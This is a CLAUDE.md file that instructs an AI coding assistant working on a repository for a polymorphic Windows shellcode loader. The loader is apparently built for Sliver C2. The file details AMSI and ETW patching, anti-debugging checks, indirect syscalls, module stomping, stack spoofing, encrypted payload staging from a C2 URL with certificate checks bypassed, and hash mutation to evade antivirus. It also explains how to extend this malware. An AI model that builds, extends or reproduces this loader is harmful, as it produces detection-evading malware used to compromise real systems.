# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Build Commands

```bash
# Step 1: Encrypt shellcode and generate Payload.h (required before every build)
python Encrypt.py <shellcode.bin> --url https://<C2_IP>:<PORT>/payload.dat

# Step 2: Compile (assembles ASM, compiles C, mutates PE metadata)
build.bat

# Debug mode: uncomment '#define DEBUG' in Common.h before building
```

Build pipeline: `ml64 AsmStub.asm` → `cl *.c AsmStub.obj` → `python Mutate.py WUAssistant.exe`

Compiler flags: `/O1 /GS- /NODEFAULTLIB /ENTRY:Main /SUBSYSTEM:WINDOWS`

## Architecture

CRT-free x64 Windows shellcode loader with polymorphic builds. Every run of `Encrypt.py` + `build.bat` produces a binary with a unique hash.

### Execution Flow (main.c)

```
IatCamouflage → AntiAnalysis → InitializeNtSyscalls → InitializeWinApis
→ PatchEtw → PatchAmsi → BruteForceDecryption → DownloadPayload
→ Rc4DecryptPayload → ModuleStomp (or NtAllocateVirtualMemory fallback)
→ SetSpoofTarget → TpAllocWork(SpoofCallback) → TpPostWork → NtDelayExecution
```

Each step returns FALSE on failure and the loader exits silently. Anti-analysis is skipped when `DEBUG` is defined.

### Module Responsibilities

- **Syscalls.h/.c + AsmStub.asm** — Indirect syscall engine. Extracts SSN from ntdll by pattern-matching `4C 8B D1 B8 XX XX 00 00`. Falls back to neighboring stubs if hooked. `RunSyscall` jumps to a `syscall;ret` gadget inside ntdll. Uses `SET_SYSCALL()` macro to configure SSN before `RunSyscall()`. AsmStub also contains `SpoofCallback` (thread pool callback with tail-call stack spoofing) and `SetSpoofTarget`.
- **WinApi.c** — PEB walking to find kernel32, then hash-based export resolution (Jenkins One-at-a-Time 32-bit). Also provides CRT replacements (`memset`/`memcpy` via intrinsics) and IAT camouflage.
- **Evasion.c** — ETW/AMSI bypass by patching function prologues with `xor rax,rax; ret` (`48 31 C0 C3`). Anti-analysis: PEB debugger flag, NtGlobalFlag, CPU count, RDTSC timing.
- **Crypt.c** — RC4 decryption via `SystemFunction032` (undocumented advapi32 export). Brute-forces 1 byte to recover the protected RC4 key using a known hint byte.
- **Staging.c** — HTTPS download via dynamically-loaded WinINet. Self-signed cert bypass: first `HttpSendRequest` fails → set `SECURITY_FLAG_IGNORE_UNKNOWN_CA` on **same handle** → retry.
- **Stomper.c** — Module stomping: loads a sacrificial DLL (`msftedit.dll`), finds its `.text` section, overwrites it with shellcode. Memory is now attributed to a signed Windows DLL. Falls back to `NtAllocateVirtualMemory` if shellcode exceeds `.text` size.
- **Payload.h** — Auto-generated by `Encrypt.py`. Contains `#define` macros for XKEY, all XOR-encoded strings (`XSTR_*`), encoded URL (`INIT_ENCODED_URL`), and protected RC4 key (`INIT_PROTECTED_KEY`). **Never edit manually.**

### Polymorphic Build System

`Encrypt.py` randomizes per run:
- **XKEY** (XOR key for 18 DLL/API strings) — picked from values that won't produce null bytes
- **RC4 key** (16 random bytes) — protected with `(Key[i] + i) ^ random_byte`
- **URL XOR key** — separate random key for staging URL

`Mutate.py` randomizes post-build:
- PE TimeDateStamp, Rich header, section padding, checksum

### Key Design Constraints

- **No CRT**: Uses `__movsb`/`__stosb` intrinsics. `memset`/`memcpy` are manually implemented in WinApi.c with `#pragma function()`.
- **No kernel32 for execution**: Memory allocation/protection via indirect syscalls; execution via ntdll thread pool (`TpAllocWork`/`TpPostWork`); waiting via `NtDelayExecution` indirect syscall. No `NtCreateThreadEx` — avoids kernel `PsSetCreateThreadNotifyRoutine` callback.
- **RWX memory**: Required for Go-based shellcode (Sliver) that writes to its own pages.
- **Stack-based string decoding**: `DEOBF()` macro XOR-decodes byte arrays in place on the stack. The null terminator `0x00` is stored raw (not encoded), so the XOR key must not equal any character in the plaintext strings.
- **All WinINet/advapi32 APIs resolved dynamically**: `LoadLibraryA` + `GetProcAddress` obtained via PEB hash walking, then used to resolve all other APIs.

### Hash Constants (Common.h)

Syscall and API function names are identified by JOAAT hashes, not strings. When adding a new syscall or API, compute the hash with `HashStringJenkinsOneAtATime32BitA()` and add the `#define` to Common.h.

### Adding a New Obfuscated String

1. Add the plaintext to `OBFUSCATED_STRINGS` dict in `Encrypt.py`
2. Use the corresponding `XSTR_*` define in the C code: `BYTE x[] = XSTR_NAME; DEOBF(x);`
3. Re-run `Encrypt.py` to regenerate `Payload.h`
